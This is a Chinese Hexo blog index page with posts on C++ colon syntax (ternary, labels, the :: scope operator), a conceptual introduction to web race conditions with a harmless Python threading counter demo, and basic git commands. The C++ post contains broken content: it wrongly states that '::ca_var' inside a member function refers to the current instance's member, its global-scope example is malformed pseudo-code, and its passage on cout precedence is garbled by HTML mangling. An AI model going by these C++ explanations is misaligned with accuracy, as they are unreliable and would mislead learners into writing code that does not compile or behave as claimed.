<p>4、条件语句(? :)<br>与?构成条件语句，作用相当于if else，如下；<br>int a,b,c;<br>a=3;<br>b=2;<br>c=a&gt;b?a:b;// 如果a&gt;b成立，则反a赋给c，否则把b赋给c<br>条件语句的结构为：<br>条件表达式?表达式1:表达式2<br>当条件表达式为true时，表达式的值为表达式1的值，否则为表达式2的值。<br>几点说明：<br>1）?:可以嵌套，但不推荐使用（难懂），下面的表达式你能看懂啥意思不？<br>int max = i&gt;j ? i&gt;k ? i : k : j&gt;k ? j : k;<br>脑袋大了吧，呵呵。<br>2）?:具有很低的优先级，这个要注意哦，下面的程序执行结果是啥呢？<br>int i = 3;<br>int j = 2;<br>cout &lt;&lt; i&gt;j?i:j;// 出错，&lt;&lt;比&gt;具有更高的优先级，执行顺序为 ((cout&lt;<i)>j)?i:j,相当于是比较cout&lt;<i与j的大小，然后根据比较结果决定表达式值为i或j，这显然要出错的，cout<<i的值是cout，不能跟整型数j进行比较。 cout="" <<="" (i="">j)?i:j;//输出1或0，相当于(cout&lt;&lt;(i&gt;j))作为判决条件，来决定表达式的值为i或j，而cout&lt;&lt;(i&gt;j)，i&gt;j则输出1否则0，然后再将(cout&lt;&lt;(i&gt;j))作为？：的条件，如果cout正确执行则为1（true），否则为0（false），以此决定表达式值为i或j<br>cout &lt;&lt;(i&gt;j?i:j);//i&gt;j则输出i，否则输出j，表达式值为true如果cout正确执行，否则为false<br>更多的关于优先级的问题就不说了。</i与j的大小，然后根据比较结果决定表达式值为i或j，这显然要出错的，cout<<i的值是cout，不能跟整型数j进行比较。></i)></p>
<p>5、语句标签<br>通常跟goto配合使用，如：<br>step1: a = f1();<br>….<br>goto step1;<br>这种作法也不是很推荐，原因在于它破坏了语句的顺序执行，这样的代价大家应该清楚吧。不过存在即为合理嘛，既然它还存在，肯定还是有它的用处有它的好处的，比如说，多层嵌套的退出（会比break continue直观一点吧），也可以避免重复代码之类之类的</p>
<p>6、switch语句中case后。<br>这个不说了，要是不会的话，我也没话可说了。</p>
<p>7、汇编指令模板<br>这个我也不懂，不班门弄斧了，可以参考一下：<a href="http://developer.e800.com.cn/articles/2006/43/1144846933898_1.html" target="_blank" rel="noopener">http://developer.e800.com.cn/articles/2006/43/1144846933898_1.html</a><br>改天学习一下。</p>
<hr>
<hr>
<hr>
<p>1、<br>作用域符号::的前面一般是类名称，后面一般是该类的成员名称，C++为例避免不同的类有名称相同的成员而采用作用域的方式进行区分<br>如：A,B表示两个类，在A,B中都有成员member。那么<br>A::member就表示类A中的成员member<br>B::member就表示类B中的成员member </p>
<p>2、<br>全局作用域符号：当全局变量在局部函数中与其中某个变量重名，那么就可以用::来区分如： </p>
<p>char zhou; //全局变量 </p>
<p>void sleep（） </p>
<p>｛ </p>
<p>char zhou; //局部变量 </p>
<p>char(局部变量) = char(局部变量) *char(局部变量) ; </p>
<p>::char(全局变量) =::char(全局变量) *char(局部变量); </p>
<p>｝ </p>
<p>3、<br>::是C++里的“作用域分解运算符”。比如声明了一个类A，类A里声明了一个成员函数voidf()，但没有在类的声明里给出f的定义，那么在类外定义f时，就要写成voidA::f()，表示这个f()函数是类A的成员函数。例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">01  class CA &#123;    </span><br><span class="line">02  public:    </span><br><span class="line">03    int ca_var;    </span><br><span class="line">04    int add(int a, int b);    </span><br><span class="line">05    int add(int a);    </span><br><span class="line">06  &#125;;   </span><br><span class="line">07      </span><br><span class="line">08  //那么在实现这个函数时，必须这样书写：    </span><br><span class="line">09  int CA::add(int a, int b)    </span><br><span class="line">10  &#123;    </span><br><span class="line">11    return a + b;    </span><br><span class="line">12  &#125;    </span><br><span class="line">13      </span><br><span class="line">14  //另外，双冒号也常常用于在类变量内部作为当前类实例的元素进行表示，比如:    </span><br><span class="line">15  int CA::add(int a)    </span><br><span class="line">16  &#123;    </span><br><span class="line">17    return a + ::ca_var;    </span><br><span class="line">18  &#125;   </span><br><span class="line">19      </span><br><span class="line">20  //表示当前类实例中的变量ca_var。</span><br></pre></td></tr></table></figure>
<p>转载：<a href="https://blog.csdn.net/zimingjushi/article/details/6549390/" target="_blank" rel="noopener">https://blog.csdn.net/zimingjushi/article/details/6549390/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/cpp/">cpp</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/24/vulnerable/race condition/"><span>web条件竞争</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/24/vulnerable/race condition/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-24T15:02:48.475Z">
          2019-04-24
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="web条件竞争"><a href="#web条件竞争" class="headerlink" title="web条件竞争"></a>web条件竞争</h1><p>维基上的解释：</p>
<blockquote>
<p>A race condition or race hazard is the behavior of an electronics, software, or other system where the system’s substantive behavior is dependent on the sequence or timing of other uncontrollable events. It becomes a bug when one or more of the possible behaviors is undesirable.</p>
</blockquote>
<p>定义：</p>
<blockquote>
<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
</blockquote>
<p>自我理解：由于服务器的并发机制，在多个用户访问同一个程序时，由于网络、资源等状况的不稳定，服务器可能无法确定谁会首先访问，从而造成资源竞争，发生越权或其他危害</p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8-*-</span><br><span class="line">import threading</span><br><span class="line">COUNT = 0</span><br><span class="line"></span><br><span class="line">def Run(threads_name):</span><br><span class="line">	global COUNT</span><br><span class="line">	read_value = COUNT</span><br><span class="line">	print (&quot;COUNT in Thread-%s is %d&quot; %(str(threads_name), read_value))</span><br><span class="line">	COUNT = read_value + 1</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	threads = []</span><br><span class="line">	for j in range(10):</span><br><span class="line">		t = threading.Thread(target=Run,args=(j,))</span><br><span class="line">		threads.append(t)</span><br><span class="line">		t.start()</span><br><span class="line">	for i in range(len(threads)):</span><br><span class="line">		threads[i].join()</span><br><span class="line">	print(&quot;Finally, The COUNT is %d&quot; %(COUNT,))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>事实上，条件竞争的利用条件可能会比较苛刻，这取决服务器的性能以及资源处理情况，将上面的程序运行n次，可能会得到8，9，10三个结果（至少我是这样）<br><img src="https://i.imgur.com/musMYQ9.png" alt=""><br>一种情况就是thread1访问完之后，thread2访问时，cpu依然认定count为0，从而两个线程同时加1造成资源争夺</p>
<blockquote>
<p>资源竞争是指，一个全局变量资源在多个线程或者进程中被同时调用，造成该全局变量资源不断的被修改</p>
</blockquote>
<p>reference：<br><a href="https://www.owasp.org/index.php/Testing_for_Race_Conditions_(OWASP-AT-010" target="_blank" rel="noopener">https://www.owasp.org/index.php/Testing_for_Race_Conditions_(OWASP-AT-010</a>)<br><a href="https://www.veracode.com/security/race-condition" target="_blank" rel="noopener">https://www.veracode.com/security/race-condition</a><br><a href="https://searchstorage.techtarget.com/definition/race-condition" target="_blank" rel="noopener">https://searchstorage.techtarget.com/definition/race-condition</a><br><a href="http://wiki.secbug.net/web_race-condtion.html" target="_blank" rel="noopener">http://wiki.secbug.net/web_race-condtion.html</a><br><a href="https://seaii-blog.com/index.php/2017/04/26/49.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2017/04/26/49.html</a><br><a href="https://mengsec.com/2018/04/07/Race-Condition/" target="_blank" rel="noopener">https://mengsec.com/2018/04/07/Race-Condition/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/race-condition/">race condition</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/24/git相关/git使用/"><span>git基本使用</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/24/git相关/git使用/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-24T11:19:54.842Z">
          2019-04-24
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="git基本使用"><a href="#git基本使用" class="headerlink" title="git基本使用"></a>git基本使用</h1><h2 id="利用git上传文件"><a href="#利用git上传文件" class="headerlink" title="利用git上传文件"></a>利用git上传文件</h2><p>在GitHub上新建respository<br>复制git地址到本地想要上传的项目文件中，将项目文件复制到新建的文件中</p>
<pre><code>git clone [url]
</code></pre><p>将文件添加进respository中：<code>git add .</code><br>添加分支信息：<code>git commit -m &quot;自定义信息&quot;</code><br>上传：<code>git push -u origin master</code></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/git/">git</a>
    </span>
    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  <a href="/" class="pagination-prev">上一页</a>
  
  
  <a href="/page/3/" class="pagination-next">下一页</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 damn1t
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>